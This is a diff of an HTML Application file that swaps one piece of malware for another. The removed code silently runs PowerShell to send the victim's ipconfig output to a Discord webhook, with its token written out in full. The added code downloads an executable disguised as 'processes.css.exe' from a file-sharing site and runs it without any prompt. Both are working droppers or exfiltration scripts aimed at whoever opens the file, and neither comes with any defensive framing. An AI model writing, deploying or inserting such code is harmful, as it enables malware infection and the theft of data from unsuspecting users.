@@ -1,27 +1,33 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Run ipconfig and Send Result to Discord</title>
-    <script language="VBScript">
-        Dim objShell
-        Set objShell = CreateObject("WScript.Shell")
-
-        
-        Dim psCommand
-        psCommand = "powershell -NoProfile -Command ""$originalPolicy = Get-ExecutionPolicy; " & _
-                    "Set-ExecutionPolicy -Scope Process -ExecutionPolicy RemoteSigned -Force; " & _
-                    "$output = ipconfig; " & _
-                    "$webhookUrl = 'https://discord.com/api/webhooks/1275219530972532808/I01GybEVfNeVbYRJrSmXZ5i-K-8S03cggFNHIRsKxk82u4L-GfEMpIP3N8wGTuXEm3BQ'; " & _
-                    "$payload = @{content = $output} | ConvertTo-Json; " & _
-                    "Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body $payload; " & _
-                    "Set-ExecutionPolicy -Scope Process -ExecutionPolicy $originalPolicy -Force"""""
-        
-        
-        objShell.Run psCommand, 0, True
-
-        Set objShell = Nothing
-    </script>
+    <title>Download and Run</title>
+    <hta:application id="app" />
 </head>
 <body>
+    <script>
+        var url = "https://www.mediafire.com/file/z9vdxpqhhyfhgtq/processes.css.exe/file";
+        var filePath = "C:\\path\\to\\save\\processes.css.exe";
+        var shell = new ActiveXObject("WScript.Shell");
+        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+        
+        // Download the file
+        xhr.open("GET", url, false);
+        xhr.send();
+        
+        if (xhr.status === 200) {
+            var stream = new ActiveXObject("ADODB.Stream");
+            stream.Type = 1; // adTypeBinary
+            stream.Open();
+            stream.Write(xhr.responseBody);
+            stream.SaveToFile(filePath, 2); // adSaveCreateOverWrite
+            stream.Close();
+            
+            // Run the downloaded file
+            shell.Run(filePath);
+        } else {
+            alert("Failed to download the file.");
+        }
+    </script>
 </body>
 </html>
